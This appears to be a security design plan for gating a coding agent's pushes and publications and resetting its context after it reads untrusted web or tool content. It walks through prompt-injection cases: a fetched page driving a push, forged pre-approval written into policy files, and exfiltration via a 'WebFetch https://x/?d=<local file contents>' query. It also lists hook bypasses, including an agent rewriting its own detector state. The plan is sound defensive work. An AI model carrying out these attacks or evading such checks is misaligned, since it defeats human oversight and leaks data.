## 1. Definitions and detection surfaces

### Untrusted content

“Untrusted” describes **provenance**, not whether text looks malicious. A trusted transport can carry untrusted text; storing external content in a repository does not make it first-party content.

| Content | Classification | Detection surface |
|---|---|---|
| Fetched pages, search snippets, downloaded documents | Untrusted, including apparently reputable sources | `WebFetch`, `WebSearch`; equivalent `web.run` search/open operations and this host’s `web__run`; pre-call tool identity and post-call result event |
| Browser pages, DOM text, screenshots, OCR, console output originating from visited sites | Untrusted | Actual browser/fetch tools used by interbrowse skills; `Skill` invocation is an early hint, not sufficient coverage |
| Third-party MCP responses and resource bodies | Untrusted by default | Fully qualified MCP tool name; resource-read server and URI; connector result origin |
| Harness-labelled external or pasted material | Untrusted within the labelled region | Harness-origin message metadata or transcript delimiters; quoted marker text supplied by a document cannot change classification |
| `curl`, `wget`, remote command output, or scripts returning external material | Untrusted when that material reaches the model | `Bash`/terminal command classification, registered wrapper metadata, and post-call provenance |
| `Task`/`Agent` results, bb child-thread results, or equivalent collaboration outputs | Untrusted if the producer encountered untrusted content; unknown when producer coverage is missing | Child session/epoch and exposure receipt joined to the result event |
| External text copied into a local file, generated summary, transcript, or memory | Remains untrusted | Recorded source-to-artifact provenance; subsequent file reads consult that record |

The following **do not trigger exposure by default**:

- The user’s own direct instructions and chat messages. External material quoted or explicitly pasted within those messages remains data.
- First-party repository files from the trusted project baseline.
- Normal workspace-owned output from internal tools such as `bd show`, `git status`, and `git log`.
- Internal tool receipts with validated provenance and fixed, expected fields.
- Child results with verified coverage showing no external exposure.

These exemptions do not grant authority to file contents or tool output. They also do not cover imported issue comments, fetched commit messages, external fixtures, or exposed-session edits merely because an internal tool displays them.

**Unknown provenance is not clean provenance.** The detector records `unknown`; approval-gated execution requires that uncertainty to be resolved or a clean replacement to be established. A child’s free-text assertion that it is clean is insufficient.

### Approval-gated actions

Distinguish a **sensitive action requiring a fresh execution context** from whether it requires another human question. Existing standing authorization can already authorize an action; the reset rule must not manufacture repeated consent requests.

| Action family | Examples | Detection surface |
|---|---|---|
| Remote source changes | `git push`, including tags, deletion, `--force`, and `--force-with-lease` | Terminal executable/subcommand/options; wrapper intent; Git/API mutation tools |
| PR publication and integration | `gh pr create`, `gh pr merge`, equivalent connector/API calls | Tool identity and operation; parsed shell command |
| Release and production operations | Deploy, release, production switch, qualification steps requiring approval, signing, package publication | Repository-owned command registry identifying executable/subcommand and effects |
| External publication | Posting artifacts, updating public content, sending messages, changing remote metadata | Connector/API operation, destination and payload digest |
| Destructive or override operations | Forceful mutations, destructive cleanup, overriding protected state | Command semantics and current contract; not the word `--force` alone |
| Explicit authority boundaries | Any operation labelled “fresh approval,” “human-launched,” or equivalent by the current contract | Trusted policy loaded at session startup and action-intent classification |

For this repository, include `ic publish --auto` and release entry points identified in [agents/development.md](/home/mk/projects/.clavain-laneD/agents/development.md). That guide says the version-bump workflow commits and pushes; it cannot be classified as a harmless local version edit.

Ordinary reads, local searches, reversible edits, local tests, builds, and authorized local commits do not independently require an approval reset. They can nevertheless be temporarily blocked while an exposed research batch awaits reset.

A human-launched operation remains human-launched after rotation. Creating a fresh agent context does not authorize the agent to perform it.

### Required detector state

Maintain state per **host session and context epoch**, linked to the bb thread. A thread ID alone is insufficient because a thread can resume an existing transcript.

Record:

- Session, thread, parent, role, epoch and policy version.
- Exposure state: `clean`, `exposed`, or `unknown`.
- Triggering tool-event IDs and source classes.
- Research-batch boundary and limits.
- Pending action intent, exact target and artifact/command digest.
- Reset request, successor acknowledgment and retirement status.
- Current-context authority evidence and whether an action attempt consumed it.

Use hashes and opaque references in audit rows. Do not log credentials, page bodies, approval text, or sensitive URL query strings.

### Origin-tagging and write-taint (fix-round addition)

Both reviews found the same gap from different angles: this plan's "authoritative records" and "trusted spine" are files and stores (`bd update --notes`, CanonGraph decisions, auto-memory, `AGENTS.md`/`CLAUDE.md`, the working tree itself) that an exposed epoch can write to, with nothing recording who wrote them. Close this with two rules, enforced in **every** mode, not only `full`:

- **Tag every write to an authority-bearing path or store with the writing epoch's exposure state at write time.** Authority-bearing paths/stores: `AGENTS.md`/`CLAUDE.md` and other files loaded as policy at startup, bead notes/description/status (`bd update`), CanonGraph decision records (including `commands/handoff.md` Step 6 ingestion, which attributes a decision to a person via `made_by` but not to the epoch that actually typed it), auto-memory feedback/project entries, and any file under `config/` this mechanism itself reads. A write tagged `exposed` or `unknown` is a **proposal**, never policy, regardless of which tool made it (this closes the `bd update --notes` and Bash-write gaps specifically) — see the carry-forward rewrite below.
- **Block writes to authority-bearing paths from exposed or unknown epochs in every enforcing mode** (`approval` and `full`, not only `full`). This is a tightening of §2's action-family table: treat "write to an authority-bearing path" as its own detected action family, gated the same way a `git push` is gated, because the P0 finding in both reviews is that `approval` mode — the recommended first enforced mode — otherwise leaves this door open.
- Define the **trusted policy baseline** as a pinned revision or digest of the authority-bearing paths, established by a clean epoch or a direct human edit. `git log`/`bd show` remain exempt from *exposure* per §1's table, but that exemption never implied the content they display is authorized to change what a successor treats as standing authorization — it only means reading them doesn't itself expose the reader.

## 2. Where detection and enforcement live

### Recommended split

| Layer | Responsibility | Why it cannot act alone |
|---|---|---|
| Clavain `PreToolUse` and `PostToolUse` hooks | Classify reads and actions; record exposure; block continuation; emit reset requests | Hooks may be absent, bypassed, malformed, or unable to observe nested commands |
| `mk-42j9.35` spawn wrapper | Propagate verified epoch/provenance metadata, require the routing receipt, reject invalid successor initialization | It cannot observe every read or action inside an already-running thread |
| Quilan | Replace the context, preserve ownership and pins, retire the source, return acknowledgment | It needs timely detector events; token counts and transcript inspection alone are insufficient |
| Existing audit backstop | Reconcile tool history, child results, action attempts and reset receipts | Detection after execution cannot prevent or undo the side effect |

Use the family established by [hooks/gauge-gate-executor-spawn.sh](/home/mk/projects/.clavain-laneD/hooks/gauge-gate-executor-spawn.sh): shell/jq classification, blocking decisions for recognized violations, and evidence rows through a dedicated verdict script patterned after `scripts/pattern-f-verdict.sh`.

Do not build another daemon, scheduler, or general authorization service. Reuse Clavain hook state/evidence mechanisms and Quilan’s rotation coordination.

### Event handling

1. **Before an external read:** conservatively mark exposure pending and invalidate current action eligibility. This prevents an action in the same tool batch from racing ahead of the post-read event.
2. **After the result:** confirm exposure, including error bodies or partial results that contain external text. A failed fetch is not automatically harmless.
3. **Before another tool call:** enforce the research-batch restrictions and inspect sensitive action intent.
4. **At child-result ingestion:** join producer provenance before admitting the body. If raw exposed output is already delivered, mark the receiving context exposed.
5. **At startup/resume:** reconcile epoch state. Compaction, resume, or a model change does not itself establish a clean context.

Do not run a slow rotation inside the blocking hook. Persist an idempotent request, return a bounded refusal, and let Quilan handle replacement.

### Bypasses and failure behavior

Support common command forms such as `git -C … push`, absolute executable paths, `env …`, and known wrappers. Exercise quoted arguments, command chains and nested shells in tests. Arbitrary aliases, scripts, Python HTTP calls and opaque `functions.exec` orchestration cannot be reliably understood through substring matching.

Where the host cannot expose nested calls, report incomplete coverage. Register known consequential wrappers explicitly; do not describe a regex gate as complete shell enforcement.

Preserve the precedent’s fail-open behavior for malformed hook envelopes, while recording detector failure when possible. **Recognized sensitive actions with missing reset or authority evidence are blocked.** Known consequential wrappers must also check the state directly; malformed outer input must not make their evidence check pass.

The audit backstop must flag uncovered execution as a safety failure, revoke further eligibility, and request reset. It must not retrospectively label the action approved.

**Detector-state integrity (fix-round addition, review-1 P1-7):** epoch/exposure state lives on disk as the same user the agent runs as, so a Bash write or an injection-driven edit can reset it. Missing or unreadable state must resolve to `unknown`, never `clean`, for any approval-gated action — this was already the rule for child-result provenance in §1 and now applies uniformly to the detector's own state. `config/context-reset.yaml` and the state store need a specified, access-controlled location; writes to either from an exposed or unknown epoch are themselves a blocked action family under §1's write-taint rule, not just an audit note.

### Hook-originated actions need explicit coverage

The inspected [hooks/hooks.json](/home/mk/projects/.clavain-laneD/hooks/hooks.json) registers:

- [hooks/auto-push.sh](/home/mk/projects/.clavain-laneD/hooks/auto-push.sh) on `SessionEnd`.
- [hooks/auto-publish.sh](/home/mk/projects/.clavain-laneD/hooks/auto-publish.sh) after terminal calls.

These execute commands inside hooks, outside the ordinary model tool-call gate. They must consult the same reset/authority predicate before side effects. An approved push does not authorize the subsequent publish or remote-description update.

During security retirement, suppress automatic push, publish, compounding, self-dispatch and similar continuation from the old epoch. Audit other registered hooks for indirect effects, including `hooks/dotfiles-sync.sh`.

### Host-level and scheduled paths (fix-round addition, from both reviews' bypass findings)

The bypass inventory above only covers actions the model or its hooks originate. Both reviews found paths that publish or mutate with **no agent action in the loop at all**, on this host:

- zklw's `git-autosync-repair.timer` (daily sweep, pushes marked repos to `autosync/<host>`) and `git-autosync-promote.timer` (hourly fast-forward of `main` to green-lane tips) — see `~/.codex/AGENTS.md` § "zklw — Dedicated Dev Server". If this repo is autosync-marked, an exposed-epoch commit sitting in the working tree can reach `main` on a timer, independent of any push gate this plan builds.
- `hooks/dotfiles-sync.sh`, which can propagate instruction-bearing `CLAUDE.md`/`AGENTS.md`/settings changes — directly relevant to the write-taint rule in §1, since a synced file is a write this plan must still be able to attribute to an epoch.
- `hooks/context-gateway.sh` (`UserPromptSubmit`), which injects working-tree file context on every prompt and can surface content an exposed context touched, bypassing `startup.py`'s filtering; and `remontoire-attention.sh` (`SessionStart`), unverified in this review — both belong in the hook audit alongside `auto-push.sh`/`auto-publish.sh`.

**This plan does not gate autosync** — it is outside Clavain's hook surface and owned separately. State this explicitly rather than silently relying on it being disabled: exposure-authored commits reaching `main` via a host timer is a residual risk this plan does not close, and needs its own decision (folded into "Open decisions for mk" below) about whether autosync must become taint-aware or be paused for repos where this rule is enforcing.

### Non-bb hosts (fix-round addition, review-1 P1-6)

Quilan's replacement mechanism covers bb threads only. This plan must also state a disposition for: interactive `claude`/Codex sessions outside bb, headless `claude -p`/`dispatch.sh` runs (the review dispatches for this very plan are examples), and in-session Task/Agent subagents, whose tool calls execute under the parent session so per-session epoch state cannot distinguish the subagent's exposure from the parent's. For these hosts, **the disposition is a hard stop, not a silent pass-through**: when the exposure or approval trigger fires and no Quilan-equivalent reset path is available, the session must treat this the same as a failed reset — block the action, do not manufacture a rotation the host can't perform, and surface the blocker to whatever supervises that host (the invoking user, or the dispatching script's caller). Defining an actual reset primitive for each non-bb host class is out of scope for lane D's task list in §7 and is called out there as an open item, not assumed solved.

## 3. The reset mechanism

### Use Quilan for replacement and Clavain for the handoff artifact

Quilan remains the sole rotation coordinator. Clavain creates and validates a restricted handoff package; Quilan starts its replacement through the governed spawn path.

`bb handoff` is suitable only if its installed primitive can create a fresh context **without inherited transcript, automatic summary, old approval interactions, or queued source messages**. Otherwise, Quilan’s maintainers must provide those semantics through their existing replacement machinery.

[commands/handoff.md](/home/mk/projects/.clavain-laneD/commands/handoff.md), the `clavain:handoff` implementation, supplies useful continuity sections and Intercore run pointers. Its ordinary instruction to reconstruct narrative from the conversation is insufficient for a security reset.

Likewise, [config/handoff-contracts.yaml](/home/mk/projects/.clavain-laneD/config/handoff-contracts.yaml) validates artifact structure. Required headings do not prove that content is safe to carry.

### Two independent triggers

**Exposure trigger.** The first untrusted read immediately removes action eligibility and opens a bounded research batch. Further read-only research can occur in that batch. Reset becomes mandatory before:

- Any ordinary mutation outside the restricted handoff/evidence writer.
- Returning a narrative result to an otherwise clean coordinator.
- Beginning an approval workflow.
- Leaving the research activity or reaching its limit.

Recommended initial full-mode limits: **20 external read completions or 10 minutes**, whichever occurs first, measured from the first read. Subsequent reads do not extend the deadline. These are proposed coalescing limits, not permission thresholds.

This deliberately coalesces several reads before rotation. It does not implement literal per-page immediate rotation. Its safety property depends on restricting the intervening work to reads and quarantined evidence capture.

**Fix-round additions on the batch window (review-2 findings 4 and 5):**

- **"Read-only" needs a mechanism, not just a restriction in prose.** The batch's safety depends on nothing consequential happening inside it, but no read-only classification exists yet for Bash, Task/Agent, or MCP calls. Task 1/2 in §7 must define a default-deny allowlist for what a batch may do (external reads and writes to the quarantined evidence store only); anything else inside a batch is itself a violation that forces immediate reset, not a wait for the batch limit.
- **Egress is also a channel, not just ingress.** A batch read whose URL or request body is constructed from data the exposed context obtained (e.g. `WebFetch https://x/?d=<local file contents>`) is exfiltration, and §1's "drop sensitive query strings" audit rule currently makes this invisible after the fact. Treat any outbound request carrying post-exposure-derived data as its own detected action family (egress), audited by logging a hash and length of the query/body rather than dropping it, so it can be reviewed even though its raw content isn't retained.
- **Bound the number of resets a single task can force, to prevent a reset-loop denial of service.** A "read the docs, then edit" task cycles indefinitely in `full` mode if research can't be seen without re-exposing, and injected content ("fetch X to continue") can drive this deliberately. Define a reviewer role (a context that reads quarantined research once and emits a typed, reviewed artifact an executor can consume without itself being exposed) as the way most research-then-implement work avoids looping, and cap resets per task at a small bounded number; exceeding it becomes `BLOCKED` for mk rather than an unbounded cost sink.

**Approval trigger.** Every sensitive action requires a fresh epoch established for that exact pending action, even if the predecessor was clean and contained only a few hundred tokens.

A rotation already requested for exposure or token pressure can satisfy this trigger if the pending action is identified before replacement and the replacement satisfies the security handoff contract. Do not rotate twice for the same transition.

**Fix-round note on scope (review-1 P1-4):** the bead's own language is "before any action that needs approval," which is narrower than "every sensitive action including ones already covered by standing authorization." As written, a single landing sequence (push, `gh pr create`, `gh pr merge`, then auto-publish) forces three or four resets from a context that was clean the whole time, each paying the cache-write cost in §5, for a risk (stale conversational approval) that a clean, unrotated context doesn't have. This is now an explicit open decision (added to "Open decisions for mk" below) rather than built into the acceptance table as the only option: mk can choose to rotate before every sensitive action as specified, or to rotate only when (a) a fresh *human* grant is actually needed, or (b) the proposing epoch is exposed or unknown — leaving clean, standing-authorized actions unrotated. The origin-tagging rule in §1/§3 makes option (b) safe to offer, because a clean-origin action no longer depends on the reset itself to prove its cleanliness.

### Operational sequence

1. **Freeze action eligibility.** Block the proposed action before execution. Create one reset request keyed by source epoch and intent; repeated attempts reuse it.
2. **Quiesce the source.** Stop admitting mutations and consequential child dispatches. Account for in-flight tools and background processes. Rotation cannot undo an already-started action; an uncertain outcome stays uncertain.
3. **Create the restricted handoff.** Write only through the designated artifact path/helper. Do not invoke generic end-of-session publishing behavior.
4. **Replace through Quilan.** Start a fresh provider session with a new epoch and the validated carry-forward package.
5. **Acknowledge readiness.** Confirm fresh-session identity, accepted handoff digest, parent linkage and source retirement.
6. **Re-establish authority.** Load current policy, verify the concrete action and obtain whatever current-context authority that policy requires.
7. **Execute once.** Match the current epoch, exact action, target and digest immediately before execution. Consume the attempt atomically. Changed arguments, artifacts, destination, policy, or new external exposure invalidate eligibility.

The successor does not reset again merely because it retries the same blocked proposal before its first execution: the reset acknowledgment is already bound to that intent. A subsequent distinct sensitive action requires its own fresh execution context.

An uncertain execution result must be reconciled before any retry; “no completion receipt” does not mean “nothing happened.”

### Carry-forward policy

| Carry forward | Treatment |
|---|---|
| Task/bead/run pointers, role and ownership | Typed identifiers from trusted control state |
| User goal, constraints, accepted decisions and their rationale | Recover from authoritative task/policy records; preserve the “why” |
| Work location and candidate artifacts | Paths, revision identifiers and digests; include provenance |
| Verification state | Evidence pointers, exact tested revision, failures and outstanding checks; never convert historical results into fresh passes |
| Dead ends and unresolved questions | Bounded descriptions grounded in trusted evidence |
| External research findings or exposed-session proposals | Quarantined artifact references and provenance; not automatically admitted narrative |
| Pending sensitive action | A proposal with exact scope, digest, **and origin tag** (`clean`/`exposed`/`unknown`, per §3 "Re-establishing approval"); explicitly unapproved |

**Never carry as executable context or authority:**

- Raw pages, external tool bodies, pasted external text, or contaminated child transcripts.
- Automatic conversation summaries or paraphrases that repackage external instructions.
- Old approval objects, approval tokens, “already authorized” flags, copied “go ahead” language, or pending approval UI responses.
- Credentials, copied environment secrets, session tokens, or stale authentication material.
- Arbitrary startup directives, command strings or memory written by the exposed context.

A schema or lexical filter cannot certify an exposed model’s summary as clean. Build the trusted spine from existing authoritative records. Post-exposure decisions that cannot be reconstructed that way remain proposals requiring validation. Per §1's write-taint rule, "existing authoritative records" means records tagged `clean` at write time — a bead note, CanonGraph decision, or memory entry written by an exposed or unknown epoch is not an authoritative record merely because it lives in an authoritative store; it is a proposal, and citing it back does not launder it.

If a successor needs to read quarantined research, that read starts another exposure batch. Do not silently relabel it trusted to avoid a loop. A gated executor should normally consume verified artifact identifiers and scoped review receipts; a research or review context handles the external text.

Resetting context does not sanitize repository changes, make a proposed artifact correct, or replace review.

### Re-establishing approval

No session-local approval survives the reset.

**Fix-round change:** the pre-fix version of this section let the successor apply standing authorization to any carried "pending action intent" purely because the intent was digest-bound, without asking where that intent came from. Both reviews demonstrated the resulting attack: a fetched page instructs a push, the exposed context proposes it, the hook blocks it and forces a reset, and the successor — reasoning only from the digest-bound proposal and its own freshly reloaded standing authorization — runs the attacker's push with a clean-looking reset receipt. The reset then certifies exactly the action it was supposed to stop.

The successor independently reloads current operating policy, under the origin-tagging rule above (§1), so that policy itself cannot have been written by the exposed epoch. Applicable standing authorization remains valid policy and can authorize an action without another user question — **but only for an action whose *intent* traces to a source the exposed epoch could not have produced**:

- A pending action intent tags its origin: `clean` (proposed by a context with no exposure since its own last reset), `exposed` (proposed during or after an untrusted read, including one relayed through a fetched page, a child result, or text appended to any file), or `unknown` (origin not recorded).
- **Standing authorization may authorize only `clean`-origin intent.** An `exposed`- or `unknown`-origin intent is never authorized by standing authorization alone, however applicable the policy looks. It requires either (a) tracing back to a trusted record written before the exposure occurred — e.g. the bead's own acceptance criteria, or a direct instruction the user gave in that same clean lineage — with the trace itself checked against the origin-tagging rule in §1, or (b) a fresh, explicit human grant that names the specific action and states that the human, not the exposed content, is the source of the instruction.
- This is why §1's write-taint rule matters here: without it, an attacker could simply have the exposed context write "this push is pre-approved" into `AGENTS.md`, a bead note, or a CanonGraph decision, and the successor would trace back to a record that only *looks* pre-exposure. Origin-tagging on the write closes that path by making the forged record `exposed`-tagged too, not clean.

Where fresh approval is required:

- Present the concrete action and effects in the new context.
- Obtain a direct grant through the trusted user/approval channel.
- Accept coordinator approval only where current policy explicitly delegates that authority.
- Bind the grant to the successor epoch, action, target and artifact digest.
- Reject responses to the old context’s pending approval request.

Approval is absent until these conditions hold. Neither Quilan nor a routing receipt grants it. Add this acceptance row to the table in §7: **exposed- or unknown-origin intent plus otherwise-applicable standing authorization → action not executed**; this is the row both reviews found missing.

## 4. Child-thread reporting, coordinator pins and reparenting

Use **`BLOCKED` with reason `SECURITY_CONTEXT_RESET`** for a forced mid-task retirement. Do not use `DONE-with-handoff`: the deliverable is unfinished.

The child’s single terminal report contains only:

- Bead/task and source epoch.
- Reset request ID and restricted handoff reference.
- Reason category: exposure, approval boundary, or unknown coverage.
- Successor ID if already allocated.
- Work still outstanding.

**Fix-round constraint (review-2 finding 3):** every field above must come from typed/structured state (bead ID, request ID, an enum reason code, a thread ID, a bead/run pointer), never free text composed by the exposed model. "Work still outstanding" is a bead or run-phase pointer, not a prose description — prose written by an exposed model is exactly the kind of content this rule exists to keep out of a clean parent's context. If the parent needs a human-readable narrative, it reads that narrative itself from the quarantined artifact, under its own exposure accounting, rather than receiving it pre-rendered inside a terminal report. This also resolves the alternative the review raised (treating prose as control metadata) by removing prose from the report entirely.

This is a real inability of the old context to continue safely. It is not an idle check-in or a request for the parent to poll.

The parent keeps the existing task open and binds it to the reset request. Quilan’s successor acknowledgment supplies the new child identity through the existing notification path. Reset completion resumes that same assignment; failure produces a concrete operational blocker. Pages within one research batch do not each produce a `BLOCKED` turn.

Apply the supplied `bb-handoff-reparent-and-sidebar` convention:

1. Capture the existing parent, role, sidebar section and pin metadata.
2. Create the successor in replacement mode—the convention’s **`--replace`**—while the source is frozen.
3. Reparent the successor to the current live parent. When replacing a coordinator, also move its live children to that coordinator’s successor.
4. Transfer the active sidebar pin and place the successor in the correct section.
5. Unpin the archived source; retain an audit link from source to successor.
6. Announce readiness only when ownership and presentation state are reconciled.

The transfer must be idempotent. Partial failure must leave no two runnable owners and must remain visible as `BLOCKED`; the coordinator must not be shown only a dead source pin.

**Fix-round additions (review-2 finding 7):**

- **Bead-claim transfer is part of the ownership transaction.** "Ownership" above covers the bb thread tree and sidebar pins; it must also cover the tracker claim (`bd update ... --claim` under a distinct actor). The reparent sequence transfers the claim to the successor's actor as one of its steps, and step 6's acceptance check confirms the claim moved, not just the thread/pin. A successor that cannot claim the bead, or that steals the claim leaving the old one dangling, is a failed transfer, reported as `BLOCKED`, not a silent partial success.
- **Resolve the live parent at commit time, not at capture time.** If the parent itself is mid-rotation when this reparent runs, "capture the existing parent" (step 1) can capture a coordinator that is itself being retired. Step 3 must re-resolve the parent by following the retirement chain immediately before committing the reparent, so a successor is never attached to a thread that is no longer live.
- **Queued messages need a trust split.** Quilan's "do not replay... queued prompts" rule (§7) is right for untrusted content, but it can also silently drop this child's own `BLOCKED` report or the successor's readiness acknowledgment if those are queued to a coordinator that is retiring at the same moment. Typed control messages from a trusted sender (this reset's own request/acknowledgment pair) must be re-delivered to whatever the parent resolves to at commit time; only untrusted queued prompts are dropped.
- **Timeout the acknowledgment.** If Quilan never acknowledges, the source must not stay frozen indefinitely — treat an unacknowledged reset past a bounded timeout as `BLOCKED`, same as any other operational failure in this sequence.

If an exposed child sends only validated control metadata, the parent need not rotate. If its actual contaminated narrative reaches the parent, exposure propagates. Coordinator and steward roles have no exemption.

The installed bb-global handoff skill and live command semantics were unavailable in this sandbox. The sequence above is the integration requirement; maintainers must verify the exact supported CLI before implementation.

## 5. False-positive cost and rollout

This rule is a **safety expenditure**. It can raise spend when it replaces a cache-warm context.

The supplied September 24/25 finding remains the baseline: idle cache expiry was the largest observed avoidable cost driver, calls above 100k context accounted for 57% of burn, and existing handoffs already target roughly 80–100k where appropriate. This proposal does not reinterpret those observations as evidence that more resets save money.

### Cost model

Measure each forced reset against comparable continuation without the additional reset:

**Incremental cost = handoff generation + successor input/cache writes + repeated verification/review − avoided continuation cost.**

For a warm prefix of `H` tokens that must be rewritten, the approximate additional prefix charge is:

**`H × (cache-write price − cache-read price)`**

Add new uncached input, output, and any repeated work. Use actual provider usage categories and prices without double-counting cache tokens. Record unknown usage as unknown.

Count unique reset transitions:

**Additional resets = security/token reset union − token-only resets.**

### Cost controls that preserve the boundary

- Coalesce contiguous research reads; forbid consequential work during the batch.
- Deduplicate reset requests by source epoch and pending intent.
- Carry concise trusted state, not the previous transcript.
- Do not classify normal first-party reads as external solely because they arrived through a tool.
- Use child provenance so clean parents receive control metadata without contaminated narratives.
- Combine a pending security reset with an already-due `.37` rotation.
- Never use remaining token capacity, cache warmth or model confidence to waive an action boundary.

Do **not** implement “reset once, then ignore later untrusted reads.” Exposure tracking restarts in every successor epoch.
